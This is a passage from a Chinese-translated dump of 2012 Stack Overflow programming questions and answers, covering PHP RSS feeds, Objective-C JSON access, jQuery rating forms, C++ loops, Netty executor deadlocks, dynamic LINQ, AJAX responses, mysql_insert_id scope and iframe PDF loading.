我不知道有什么办法可以阻止这些电话。就我而言，我使用一个简单的条件来解决这个问题，当没有 JSON 可供读取时，该条件会退回到一个空地图。

```
(if-not (clojure.string/blank? %)
   (json/read-str % :key-fn keyword)
   {}) 
```

# php - 获取谷歌浏览器以查看 RSS 提要

> ID：10114819
> 
> 赞同：0
> 
> 时间：2012-04-11T22:21:28.687
> 
> 标签：php, css, google-chrome, rss

我有一个动态生成 RSS-Feed 的 .php 脚本。

我想将 .css 样式表链接到此脚本，以使没有内置 RSS 查看器的浏览器能够显示此提要。我这样做

```
echo "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\r\n";
echo "<?xml-stylesheet type=\"text/css\" href=\"rss.css\" ?>\r\n"; 
```

作为 .php 文件的第一个输出命令。

但是，像 chrome 之类的浏览器仍然不会将提要显示为网页 - 而是 chrome 向我显示此页面的代码。

从本教程中，我知道这是可能的......

[http://www.petefreitag.com/item/208.cfm](http://www.petefreitag.com/item/208.cfm)
[http://www.petefreitag.com/rss/](http://www.petefreitag.com/rss/)

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:26:21.023

您应该添加`header`调用以指定内容类型，如下所示：

```
header("Content-Type: application/rss+xml"); 
```

[http://www.ibm.com/developerworks/library/x-phprss/](http://www.ibm.com/developerworks/library/x-phprss/)了解更多信息。

# objective-c - 在 Objective C 中访问 JSON 数据

> ID：10114821
> 
> 赞同：0
> 
> 时间：2012-04-11T22:21:42.513
> 
> 标签：objective-c, ios, json

我已下载我的 JSON 数据，但无法访问特定对象。从我的 JSON 数据中，我试图`value`从`variableName = "Elevation of reservoir water surface above datum, ft";`

这是我的代码：

```
- (void)viewWillAppear:(BOOL)animated {
[super viewDidAppear:animated];

NSURL *url = [NSURL URLWithString:@"http://waterservices.usgs.gov/nwis/iv/?sites=02334400&period=P7D&format=json"]; 

NSData *jsonData = [NSData dataWithContentsOfURL:url];
if (jsonData != nil) {
    NSError *error = nil;

    id result = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error: &error];

    if (error == nil)
        NSLog(@"%@", result);
}
} 
```

编辑：打印输出的数据太多，但这是我在 JS 中访问对象的方式。我似乎无法编写在 Obj-C 中执行相同操作的 for 语句：

```
 var d = JSON.parse(responseText);
    for (var i = 0; i < d.value.timeSeries.length; i++) {
        if (d.value.timeSeries[i].variable.variableName == 'Elevation of reservoir      water surface above datum, ft') {
            var result = d.value.timeSeries[i].values[0].value[d.value.timeSeries[i].values[0].value.length - 1];
            console.log(result);
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T23:06:43.243

这很丑陋，但它应该给你一些东西开始：

```
NSArray *timeSeries = [JSON valueForKeyPath:@"value.timeSeries"];

[timeSeries enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
    NSString *variableName = [obj valueForKeyPath:@"variable.variableName"];

    if ([variableName isEqualToString:@"Elevation of reservoir water surface above datum, ft"]) {

        NSArray      *values = [obj valueForKey:@"values"];
        NSDictionary *value  = [values objectAtIndex:0];

        values = [value objectForKey:@"value"];
        value  = [values lastObject];

        NSLog(@"%@", [value objectForKey:@"value"]);
    }
}]; 
```

**笔记**

没有任何形式的验证/范围检查我会把它作为练习留给你做

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-17T05:44:09.047

您可能会考虑的一件事是使用工具为您生成模型类。这样你就可以使用点访问器让你的生活更轻松一些。在 Mac App Store 中，JSON Accelerator 或 Objectify 是不错的选择。然后，您将 NSDictionary 通过管道传输到这些模型类中，这很容易。

# jquery - rails 3.2中单个页面上的多个ajaxified评级表格

> ID：10114823
> 
> 赞同：0
> 
> 时间：2012-04-11T22:21:43.050
> 
> 标签：jquery, ruby-on-rails, forms, ruby-on-rails-3.2

我正在尝试对来自 (http://eighty-b.tumblr.com/post/1569674815/creating-an-ajaxified-star-rating-system-in-rails) 的基于 ajax 的评分系统教程进行一些修改-3)。

该教程非常棒并且有效，但我现在试图让它在一个页面上出现多次。我确定错误出在我正在使用的 jquery 中。无论我在最终的 .submit() 语句中将哪种选择器放在表单上，​​都只会提交 dom 中的顶部表单。我试过 $(this).closest('form').submit(); 我已经尝试为每个表单添加唯一的 id，但是在 .change() 之后，$(this) 获取了顶部表单。我有点期望 .change() 的行为更像 .click()

让我知道是否需要更多代码。谢谢！

.js...

```
// Sets up the stars to match the data when the page is loaded.
$(function () {
    var checkedId = $('form.rating_ballot > input:checked').attr('id');
    $('form.rating_ballot > label[for=' + checkedId + ']').prevAll().andSelf().addClass('bright');
});

$(document).ready(function() {
    // Makes stars glow on hover.
    $('form.rating_ballot > label').hover(
        function() {    // mouseover
            $(this).prevAll().andSelf().addClass('glow');
        },function() {  // mouseout
            $(this).siblings().andSelf().removeClass('glow');
    });

    // Makes stars stay glowing after click.
    $('form.rating_ballot > label').click(function() {
        $(this).siblings().removeClass("bright");
        $(this).prevAll().andSelf().addClass("bright");  
    });

    // Submits the form (saves data) after user makes a change.
        $('form.rating_ballot').change(function() {
        $('form.rating_ballot').submit();
    });        
}); 
```

形式...

```
<%=  content_for(:rating_scripts) do      %>
<%= javascript_include_tag 'rating_ballot' %> 
<% end %>                          

<%= form_for(rating_ballot, :remote => true, :html => { :class => 'rating_ballot', :id => 'rating-form-' + audition.id.to_s }) do |f| %>
    <%= f.label("value_1", content_tag(:span, '1'), {:class=>"rating", :id=>"1"})   %>
  <%=  radio_button_tag("rating[value]", 1, current_user_rating == 1, :class => 'rating_button') %>
    <%= f.label("value_2", content_tag(:span, '2'), {:class=>"rating", :id=>"2"})   %>
  <%=  radio_button_tag("rating[value]", 2, current_user_rating == 2, :class => 'rating_button') %>
    <%= f.label("value_3", content_tag(:span, '3'), {:class=>"rating", :id=>"3"}) %>
    <%= radio_button_tag("rating[value]", 3, current_user_rating == 3, :class => 'rating_button') %>
    <%= f.label("value_4", content_tag(:span, '4'), {:class=>"rating", :id=>"4"})      %>
  <%=  radio_button_tag("rating[value]", 4, current_user_rating == 4, :class => 'rating_button') %>
    <%= f.label("value_5", content_tag(:span, '5'), {:class=>"rating", :id=>"5"})      %>
  <%=  radio_button_tag("rating[value]", 5, current_user_rating == 5, :class => 'rating_button') %>

                <%= hidden_field_tag("audition_id", audition.id)    %>
           <%= f.submit :Submit, {:id=>"submit"} %>
<% end %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:54:42.020

我猜表单ID不是唯一的。查看您的代码，它看起来好像这一行：

```
<%= form_for(rating_ballot, :remote => true, :html => { :class => 'rating_ballot', :id => 'rating-form-' + audition.id.to_s }) do |f| %> 
```

应该使用 rating_ballot 记录的 id 而不是试镜 id 可能吗？在浏览器中查看呈现页面的源代码，并验证每个表单的 id 是唯一的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T06:28:34.877

伙计，这很有趣，我刚刚在自己的应用程序中完成了这项工作。这是我的 jquery（我并不擅长编写 jquery，但这是我要工作的，所以如果有设计错误，我很抱歉，请告诉我）

```
// Sets up the stars to match the data when the page is loaded.
$(function () {
    $.renderOldVote = function() { // name function so it can be called after mouseout
        var checkedId1 = $('form.people > input:checked').attr('id');
        var checkedId2 = $('form.music > input:checked').attr('id');
        var checkedId3 = $('form.venue > input:checked').attr('id');
        var checkedId4 = $('form.atmosphere > input:checked').attr('id');
        $('form.people > label[for=' + checkedId1 + ']').prevAll().andSelf().addClass('checked');
        $('form.music > label[for=' + checkedId2 + ']').prevAll().andSelf().addClass('checked');
        $('form.venue > label[for=' + checkedId3 + ']').prevAll().andSelf().addClass('checked');
        $('form.atmosphere > label[for=' + checkedId4 + ']').prevAll().andSelf().addClass('checked');
    };
    $.renderOldVote();
});

$(document).ready(function() {
    // Makes stars glow on hover.
    $('form.people > label,form.music > label,form.venue > label,form.atmosphere > label').hover(
        function() {    // mouseover
            $(this).siblings().andSelf().removeClass('checked');
            $(this).prevAll().andSelf().addClass('glow');
            },
        function() {  // mouseout
            $(this).siblings().andSelf().removeClass('glow');
            $.renderOldVote();
        }
    );
    // Makes stars stay glowing after click.
    $('form.people > label,form.music > label,form.venue > label,form.atmosphere > label').click(function() {
        $(this).siblings().removeClass("checked");
        $(this).prevAll().andSelf().addClass("checked");
    });
    // Submits the form (saves data) after user makes a change.
    $('form.people').change(function() {
        $('form.people').submit();
    });
    $('form.music').change(function() {
        $('form.music').submit();
    });
    $('form.venue').change(function() {
        $('form.venue').submit();
    });
    $('form.atmosphere').change(function() {
        $('form.atmosphere').submit();
    });
}); 
```

听起来您并没有区分您的表单ID（正如帕特里克所说）。当我这样做时，我仍然只使用了其中的一部分表单代码，但我传入了一个参数，允许表单 ID 和相应的标签 ID 是唯一的。此外，我的代码没有使用指南希望您使用的 dim_star（这只是我个人的偏好）。让我知道你是否卡在某个部分。

# c++ - C++ 公式用于增加一周中的工作时间

> ID：10114824
> 
> 赞同：0
> 
> 时间：2012-04-11T22:21:51.697
> 
> 标签：c++, equation

我试图弄清楚如何将一周内的所有工作时间加起来。“hours”表示一周的工作时间，“hoursDay”表示一天的工作时间。唯一的问题是弄清楚当它们都用相同的名称表示时如何将它们全部添加。以下是我的代码：（谢谢）

```
 cout << "Enter hours worked for day 1: ";
    cin >> hoursDay;
    cout << endl;

    while (hoursDay < 0 || hoursDay > 10)
    {
        cout << "Invalid number of hours - must be between 0 and 10.";
        cout << endl;
        cout << "Enter hours worked for day 1: ";
        cin >> hoursDay;
    }

    cin.ignore (1);

    cout << "Enter hours worked for day 2: ";
    cin >> hoursDay;
    cout << endl;

    while (hoursDay < 0 || hoursDay > 10)
    {
        cout << "Invalid number of hours - must be between 0 and 10.";
        cout << endl;
        cout << "Enter hours worked for day 2: ";
        cin >> hoursDay;
    }

    cin.ignore (1);

    cout << "Enter hours worked for day 3: ";
    cin >> hoursDay;
    cout << endl;

    while (hoursDay < 0 || hoursDay > 10)
    {
        cout << "Invalid number of hours - must be between 0 and 10.";
        cout << endl;
        cout << "Enter hours worked for day 3: ";
        cin >> hoursDay;
    }

    cin.ignore (1);

    cout << "Enter hours worked for day 4: ";
    cin >> hoursDay;
    cout << endl;

    while (hoursDay < 0 || hoursDay > 10)
    {
        cout << "Invalid number of hours - must be between 0 and 10.";
        cout << endl;
        cout << "Enter hours worked for day 4: ";
        cin >> hoursDay;
    }

    cin.ignore (1);

    cout << "Enter hours worked for day 5: ";
    cin >> hoursDay;

    while (hoursDay < 0 || hoursDay > 10)
    {
        cout << "Invalid number of hours - must be between 0 and 10.";
        cout << endl;
        cout << "Enter hours worked for day 5: ";
        cin >> hoursDay;
    }

    cin.ignore (1);

    hours = hoursDay;

    cout << endl;
    cout << endl;
    cout << "Total hours for week is " << hours; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T23:04:58.467

尝试使用 for 循环：

```
int hours=0;
for(int i=0;i<5;i++){
    int hoursday;
    cout << "enter hours worked in day " << i+1 << ":" ;
    while(cin>>hoursday ){
        if(hoursday>0 && hoursday<10){
            hours+=hoursday;
            break;
        }
        else{
            continue;
        }
    }
}

cout <<"total hours in the week : "<<  hours << endl; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T15:58:45.323

看来您是初学者，您的程序中有很多错误。但是，让我祝贺你以不同的方式思考。

您希望程序运行的方式至少需要一个最初设置为 0 的变量，然后将其加起来。我正在发布您的代码的改进版本。要查看它是否有效，请将其复制并粘贴到编译器中并查看结果。

你的代码应该是这样的。好吧，我的缩进很奇怪......

```
#include<iostream.h>
#include<conio.h>

void main()
{
    int hoursDay;
        hoursDay=0;
        int hoursday;
        for(int k=1;k<=5;k++)
             {
                 cout<<"Enter hours worked for day"<<k<<"\n";
                 cin>>hoursday;
                 if(hoursday>0&&hoursday<10)
                     {
                             hoursDay=hoursDay+hoursday;
                     }
                 else
                         {
                             cout<<"\ninvalid input";
                            }

                                 }
             int  hours = hoursDay;

             cout << endl;
             cout << endl;
             cout << "Total hours for week is " << hours;
    getch();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:25:41.980

每次输入时只需将 hoursDay 添加到 hours`hours += hoursDay;`

不要重复你的代码5次，使用循环

（虽然这看起来像是一个开始练习，所以你可能还没有涵盖循环）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T22:25:38.513

`The only problem is figuring out how to add them all when they are all represented by the same name.`有几种方法可以解决这个问题，但如果不添加至少一个附加变量，它们都不可能。

一个简单的方法是添加一个新变量`int totalHours`（或浮点数或双精度，无论您使用什么）并将其预初始化为零。然后对于每个输入，设置`totalHours += hoursDay;`.

# c# - 使用 JSON 通过 HTTP 将文件元数据上传到服务器是一个不错的选择吗？

> ID：10114834
> 
> 赞同：0
> 
> 时间：2012-04-11T22:22:58.673
> 
> 标签：c#, json, http

我继承了一个基于 WPF 的应用程序，它允许用户通过将文件上传/下载到服务器来共享文件。在当前实现中，在发送文件内容之前。从所有文件中提取文件元数据（名称、类别、版本等）并放入 csv 文件并使用 Http 流发送到服务器。

阅读代码后，我不确定当前的实现 - 将所有元数据放在一个文件中，然后使用 HTTP 流上传，是否是理想的解决方案。我读过 JSON，但从未使用过它。对于这种情况，Json 是一个不错的选择吗？

# javascript - 防止另一个事件在前一个事件在 jQuery 中完成之前触发？

> ID：10114835
> 
> 赞同：1
> 
> 时间：2012-04-11T22:23:07.547
> 
> 标签：javascript, jquery, events

[http://jsfiddle.net/jmPCt/18/](http://jsfiddle.net/jmPCt/18/)

我对 JS 和 jQuery 很陌生。我已经在上面的链接中手动编写了所有代码。它可以工作并且可以做我希望它保存的事情，但只有一件事。如果您快速单击“下一个”链接，您将看到要显示的下一个容器的闪烁，或者，如果您单击得足够快，代码将显示两个容器，但我只想一次显示一个。有没有办法在 jQuery 中处理这个问题？我尝试过使用此处讨论的停止：[How to prevent jquery hover event from fire when not complete?](https://stackoverflow.com/questions/6512644/how-to-prevent-jquery-hover-event-from-firing-when-not-complete) 但这并不能解决问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:25:42.847

您正在寻找`.stop()`. 它的实现随所需行为而变化，但文档应该为您清除： http: [//api.jquery.com/stop](http://api.jquery.com/stop)

这是一个演示：http: [//jsfiddle.net/jmPCt/19/](http://jsfiddle.net/jmPCt/19/)

由于`.stop()`工作原理，当您使用它时，`.fadeIn()`或者`.fadeOut()`您可以将动画切碎到它们不再起作用的程度。我发现的最佳解决方法是始终使用以下方法将动画设置为绝对值`.fadeTo()`：[http ://api.jquery.com/fadeTo](http://api.jquery.com/fadeTo)

这是我添加到您的 JSFiddle 中的代码，它用使用and的函数覆盖了默认函数`.fadeIn()`和`.fadeOut()`jQuery 函数：`.fadeTo()``.stop()`

```
$.fn.fadeOut = function (duration, callback) {
    $(this).stop().fadeTo(duration, 0, function () {
        $(this).css('display', 'none');
        if (typeof callback == 'function') {
            callback();
        }
    });
};
$.fn.fadeIn = function (duration, callback) {
    $(this).css('display', 'block').stop().fadeTo(duration, 1, function () {
        if (typeof callback == 'function') {
            callback();
        }
    });
}; 
```

# 更新

如果您`position`为“幻灯片”元素设置属性，那么它们可以相互叠加动画，这将消除您的代码表现出的跳跃性：

HTML --

```
<div id="controls">
    <div id="countah"></div>
    <a href="#" id=prev>prev</a> | 
    <a href="#" id=next>next</a>
</div> 
```

CSS——

```
.js .staceyPort {
    display: none;
    position : absolute;
    top      : 0;
    left     : 0;
}

#controls{ 
    position   : fixed;
    bottom     : 0;
    left       : 0;
    z-index    : 1000;
    background : gold;
}​ 
```

这是一个演示：http: [//jsfiddle.net/jmPCt/21/](http://jsfiddle.net/jmPCt/21/)

# c# - 按类别过滤图像，RSS阅读器

> ID：10114837
> 
> 赞同：2
> 
> 时间：2012-04-11T22:23:24.590
> 
> 标签：c#, windows-phone-7, collections, rss, merge

我发现了一个很棒的 RSS 阅读器，它只能获取图像。
地点：[http ://www.kunal-chowdhury.com/2011/08/fetching-picasa-images-through-rss-in.html](http://www.kunal-chowdhury.com/2011/08/fetching-picasa-images-through-rss-in.html)

我想不通的是如何使阅读器仅按所需类别过滤和显示提要中的图像。我不打算将该阅读器用于 Picasa。

我使用的 RSS 提要：[http ://www.zimo.co/feed/](http://www.zimo.co/feed/)

* * *

我创建了一个 ObservableCollection

```
ObservableCollection<FeedItem> categories;

    public ObservableCollection<FeedItem> Categories
    {
        get { return categories; }
        set
        {
            categories = value;
            OnPropertyChanged("Categories");
        }
    } 
```

并更新代码如下

```
private void Feed(object sender, DownloadStringCompletedEventArgs e)
    {

        try
        {
            if (!e.Cancelled)
            {
                var xmlElement = XElement.Parse(e.Result);
                FeedItems.Clear();
//added code for pulling all categories for every item in the feed
                foreach (var katItem in from value
                                     in xmlElement.Elements("channel").Elements("item").Elements("category")
                                        select value.Value
                                            into xCategory
                                            where xCategory != null
                                            select new FeedItem { Category = xCategory })
                {
                    Categories.Add(katItem);

                }

                    foreach (var feedItem in from value
                                                 in xmlElement.Elements("channel").Elements("item")
                                             select value.Element("enclosure")
                                                 into xEnclosure
                                                 where xEnclosure != null
                                                 select xEnclosure.Attribute("url")
                                                     into xUrl
                                                     where xUrl != null
                                                     select new FeedItem { Link = xUrl.Value }
                                                       )
                    {

                                            FeedItems.Add(feedItem);
                    }

            }

        }
        catch
        { }
    } 
```

这样我就有了一个 Collection (Categories)，在其中我从提要中的每个项目中获取所有类别。我想知道的事情。是否可以合并这两个集合，然后按所需类别过滤新集合，以便我只得到所需的图像？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T03:08:07.080

您将不得不自己解析图像。使用 Picasa 提要，您可以获得指向稍后可以绑定到`Image`控件的图像的显式链接。使用您的提要，我看不到明确的图片链接。

# java - Executor 无法从从自身获取的 Thread 中关闭

> ID：10114838
> 
> 赞同：0
> 
> 时间：2012-04-11T22:23:33.107
> 
> 标签：java, multithreading, netty, ning

大家好：这个问题涉及线程、客户端、Netty 和 Ning。

语境

Ning 库是一个异步 HTTP 请求工具，它允许我们构建请求、对它们进行排队和异步处理它们。它依赖于一些库，例如下面粘贴的 JBoss/Netty 代码。

问题

`ExecutorUtil`我最近遇到了一个线程关闭异常，它是由 JBoss/Netty类中的这段代码引发的。

此类似乎本质上是用于在 Netty 中结束线程的实用程序。

这种方法导致我正在使用的 Web 客户端（由 Ning 提供支持）中出现错误，因为我试图关闭处理程序内部的 HttpClient 以获取该客户端的响应。

**问题**

这段代码试图避免的死锁有什么意义？有关更多详细信息，可以在[此代码 url](http://grepcode.com/file_/repo1.maven.org/maven2/com.ning/metrics.goodwill-access/0.1.4/org/jboss/netty/util/internal/ExecutorUtil.java/?v=source)中看到该类。

```
// Check dead lock.
    final Executor currentParent = DeadLockProofWorker.PARENT.get();
    if (currentParent != null) {
        for (Executor e: executorsCopy) {
            if (e == currentParent) {
                throw new IllegalStateException(
                        "An Executor cannot be shut down from the thread " +
                        "acquired from itself.  Please make sure you are " +
                        "not calling releaseExternalResources() from an " +
                        "I/O worker thread.");
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-12T05:50:52.280

在 netty 中，您不允许从 IO-Thread 中关闭 Executor（因为异常已经告诉您 ;)），这是因为您有看到死锁的风险。如果您真的想从处理程序中关闭执行程序，则需要在新线程中执行此操作。例如：

```
public void messageReceived(...) {
    // in IO-Thread
    new Thread(new Runnable() {
        public void run() {
            //....shutdown here
        }
    }).start();
} 
```

# c# - 如何从 C# 中的字符串创建基于动态 lambda 的 Linq 表达式？

> ID：10114841
> 
> 赞同：2
> 
> 时间：2012-04-11T22:24:01.193
> 
> 标签：c#, linq, lambda, expression-trees, dynamic-linq

我在从字符串创建基于 Lambda 的 Linq 表达式时遇到了一些困难。这是我使用此示例对象/类的基本案例：

```
public class MockClass
{
    public string CreateBy { get; set; }
} 
```

基本上我需要像这样转换一个字符串：

```
string stringToConvert = “x => x.CreateBy.Equals(filter.Value, StringComparison.OrdinalIgnoreCase”; 
```

进入谓词/ linq 表达式：

```
System.Linq.Expressions.Expression<Func<T, bool>>  or in this example 
System.Linq.Expressions.Expression<Func<MockClass, bool>> 
```

所以它相当于下面 Where 方法中的 Linq 表达式：

```
query = query.Where(x => x.CreateBy.Equals(filter.Value,
StringComparison.OrdinalIgnoreCase)); 
```

我尝试使用以下助手，但似乎无法弄清楚如何让它们在这种情况下工作，我希望能够从提前不知道的字符串构建 linq 表达式： [http： //www.albahari.com/nutshell/predicatebuilder.aspx](http://www.albahari.com/nutshell/predicatebuilder.aspx)

[http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx](http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx)（现在可以作为 NuGet 包使用称为“动态查询”）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T23:32:18.807

这里问了一个类似的问题：

[有没有一种简单的方法可以将（lambda 表达式）字符串解析为 Action 委托？](https://stackoverflow.com/questions/714799/is-there-an-easy-way-to-parse-a-lambda-expression-string-into-an-action-delega)

据我了解，这个“动态查询”实际上是一个框架，用于在不使用 lambda 表达式的情况下为 Where 子句传递限制。

其意义在于 lambda 表达式不是动态方法，它们是匿名方法。如果你看过一个程序集，你会看到你的 lambda 表达式被转换为闭包，其中任何自由变量作为字段。该类有一个签名与您的签名匹配的方法，在调用点分配字段变量。

考虑这一点的一种好方法是，它意味着您的 lambda 表达式在编译时由 c# 编译器解释，而变量是通过在运行时从此类实例化一个对象来解析的。

为了证明这一点，请考虑以下内容：

```
var myLambda = x => x * x 
```

你会注意到这不起作用。这是因为，为了创建相关的类/方法，编译器必须在编译时知道 x 的类型。

所有这些都很重要，因为运行时 CLR 中不存在 lambda 表达式的概念（与代码中的形式相同）。一个看起来像 lambda 表达式的字符串正是...

# php - 向ajax发送php响应

> ID：10114852
> 
> 赞同：7
> 
> 时间：2012-04-11T22:24:52.650
> 
> 标签：php, jquery, ajax, return

好的，我有一个这样结束的 php 脚本：

```
if ($success)
{
    $result = array('success' => true);
}
else
{
    $result = array('success' => false, 'message' => 'Something happened');
    header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error', true, 500);
}
  echo json_encode($result); 
```

还有一些我计划在我的脚本工作时提醒我的 jquery。

```
 jQuery(document).ready(function() {

    $.ajax({
        url: './contactengine.php',
        type: 'GET',
        dataType: 'JSON',
        success: function(response) {
                        alert("GOOD");
                },
                error: function() {
                        alert("BAD");
                }
    });

}); 
```

编辑源

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T22:33:45.457

```
 <?php 
        if ($success){
             $result = array("status" => "1");

             echo json_encode($result);
            }
            else{
              print "<meta http-equiv=\"refresh\" content=\"0;URL=/404.html\">";
            }    
        ?>
        <script>
        jQuery(document).ready(function() {

          $.ajax({
                           type: 'GET',
                           url:  'Thatscriptsomething.php',
                           cache: 'false',
                           dataType: 'json',
                           success: function(response) {
                               if(response.status == "1") {
                                    alert("we having a working script");
                               } else {
                                    alert("Oops, script is a no go");
                               }
                            }
                        });
        });
        </script> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-08-16T08:37:01.917

基本示例 - 它适用于我

**PHP 响应**

```
$value =  array('msg' => 'true' );
          echo json_encode($value); 
```

**AJAX 方法**

```
 $.ajax({  
  type: 'post',  
  url: 'URL',  
  contentType: false,
  processData: false,
  dataType:'JSON',
  data: formData,
      success: function(value) {
                if (value.msg ==  'true') {
                      //your action
                }else{
                      //your action
                }
      }
}); 
```

# css - 更好地理解 CSS 网格列 - 列，使用浮点数

> ID：10114861
> 
> 赞同：0
> 
> 时间：2012-04-11T22:25:42.777
> 
> 标签：css, web, less

我将[http://semantic.gs](http://semantic.gs)与 LESS.js 一起使用。我很难理解这些概念，并且文档对我来说并不完全清楚。我承认我没有阅读太多关于 LESS.js 的内容，但我已经阅读了 Semantic Grid System 网站上的文档。

我的理解是只有大量的列，并且每个编号的列都由 less.js 处理（？）。

```
// This LESS rule...
article {
   .column(9);
}

// Is compiled to...
article {
   display: inline;
   float: left;
   width: 700px;
   margin: 0 10px;
} 
```

这将大致相同，除了列将位于不同的位置？

我如何找到我将使用哪一列作为页脚？我不确定是否应该应用普通的 CSS 来制作页脚。

干杯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-15T01:54:33.640

很可能已经创建了一个 LESS Mixin 来定义列。大概看起来像这样。

```
.column(@span: 1) {
        float:left;
        width: 8.33333% * @span;
} 
```

@span 是您希望每个部分跨越的网格列数。所以说它是一个 12 列的网格，那么你可能希望页脚跨越网格的整个宽度：

```
footer {
        .column(12);
} 
```

# php - mysql_insert_id() 能否从另一个脚本的查询中获取值

> ID：10114864
> 
> 赞同：2
> 
> 时间：2012-04-11T22:25:44.313
> 
> 标签：php, mysql

[mysql_insert_id()](http://php.net/manual/en/function.mysql-insert-id.php)的手册说

> 因为 mysql_insert_id() 作用于最后执行的查询，所以一定要在生成值的查询之后立即调用 mysql_insert_id()。

该声明不表示任何范围。它是服务器范围的值吗？运行多个脚本或一个脚本的多个实例的服务器能否返回 mysql_insert_id() 的值，该值不是由调用它的脚本执行的最后一次插入生成的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:44:18.407

mysql_insert_id() 的作用域是 MySQL 连接。不是`user + password`，而是当前脚本的实际连接。（注意MySQL连接也可以是mysql_insert_id的参数）

如果关闭并重新打开 MySQL 连接，mysql_insert_id() 将不会返回上一个插入的 id 的 id。

如果在您添加后刚刚插入了一个 ID，但通过另一个脚本执行（我的意思是另一个连接），则 mysql_insert_id() 将返回您的 ID，而不是在您之后实际创建的 ID，而是在另一个连接中创建的 ID。

例子 ：

```
$c1 = mysql_connect($srv, $usr, $pwd);
$c2 = mysql_connect($srv, $usr, $pwd);

$sql = "INSERT INTO table1 (col1, col2) VALUES('x', 'y') "
mysql_query($sql, $c1); // first insert
mysql_query($sql, $c2); // second insert

$id1 = mysql_insert_id($c1);
$id2 = mysql_insert_id($c2); 
```

$id1 将是首先插入的 id，$id2 将是之后插入的 id。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:32:05.207

是的，请参阅以下文章：[如何获取最后插入行的唯一 ID](http://dev.mysql.com/doc/refman/5.1/en/getting-unique-id.html)

> 对于 LAST_INSERT_ID()，最近生成的 ID 在每个连接的基础上维护在服务器中。它不会被其他客户端更改。如果您使用非魔术值（即非 NULL 且非 0 的值）更新另一个 AUTO_INCREMENT 列，它甚至不会更改。从多个客户端同时使用 LAST_INSERT_ID() 和 AUTO_INCREMENT 列是完全有效的。每个客户端都将收到客户端执行的最后一条语句的最后插入 ID。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T22:33:06.770

范围是每个连接。如果脚本的每次运行都打开一个单独的连接（通常会发生这种情况），那么它们将具有单独的范围。

# php - 使用 PHP 生成和分发唯一的用户名

> ID：10114865
> 
> 赞同：1
> 
> 时间：2012-04-11T22:25:45.423
> 
> 标签：php, mysql, mysqli

我试图从服务器端生成唯一的用户名，并使用他们在注册登录表单时输入的个人详细信息将其分发给用户。这是为了制作更安全的用户名并避免黑客攻击。

所以，这是我的问题：如何从他们的个人信息（如名字、姓氏、年龄和出生日期）中生成唯一且不可预测的用户名。用户名不应遵循我们现在在 gmail 等注册表单中的任何顺序。没有什么比使用名字的首字母和姓氏或名字中的三个字母等等。用户名应该是完全不可预测的。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:35:21.433

那你为什么要让名字取决于他们的细节呢？只需生成一些均匀分布的字母串，比如`vwneuibx`（足够长，这样你就不会很快用完名字），这样的名字没人会猜到，但也不容易记住。

更安全的方法是对一些盐和您指定的个人数据进行哈希处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T23:06:27.640

idk也许是这样的......

```
function random_name($length){
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $name = "";

    for($i = 0; $i < $length; $i++){
        $name .= $characters[mt_rand(0,strlen($characters) - 1)];

        }
        return $_POST['first'].$name;

    } 
```

# javascript - 如何获取垂直列表以将 PDF 加载到 iFrame

> ID：10114873
> 
> 赞同：2
> 
> 时间：2012-04-11T22:26:11.157
> 
> 标签：javascript, iframe, onclick, setattribute

我试图让这个垂直列表加载我在 Onclick 事件期间放入 Load_content() 的文档标题。令人满意的结果将是每次我点击一个新链接......一个新的 PDF 加载到 iframe

```
<html>
<head>
    <title> Literature of Andrew Willis
    </title>

    <link rel="stylesheet" href="mycss.css" type="text/css" /> 
    <link rel="stylesheet" type="text/css" href="css/cssverticalmenu.css" />

    <script language="javascript" type="text/javascript">

    function load_content (link) {
    document.getElementById("iframe").setAttribute("src","link" );
    }

    </script>

</head>
<body>

    <div id="logo">
        <a href="#"><img src="mainlogo.jpg" height=100 width=400></a>
    </div>

    <div id="content">

        <div id="leftcolumn">

             <ul class="glossymenu">  
                <li><a href="#" onclick="load_content(Look at me now.pdf)">Short Essays</a></li>
                <li><a href="#" onclick="load_content(hangmansdog.pdf)" >Poetry</a></li>  
                    <li><a href="http://www.pourinpourout.com" >Blog</a></li>  
            </ul>
        </div> 
        <div id="rightcolumn">
            <div id="content">
            <iframe id="iframe1" src="#"></iframe>
            </div>
        </div>
    </div>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T23:49:50.100

您的代码中有一些拼写错误。您为 iframe 提供了“iframe1”的 id，但在 JS 中使用“iframe”引用了它。您也不应该在链接周围加上引号，因为您将它用作变量，第 13 行应如下所示：

```
document.getElementById("iframe1").setAttribute("src",link ); 
```

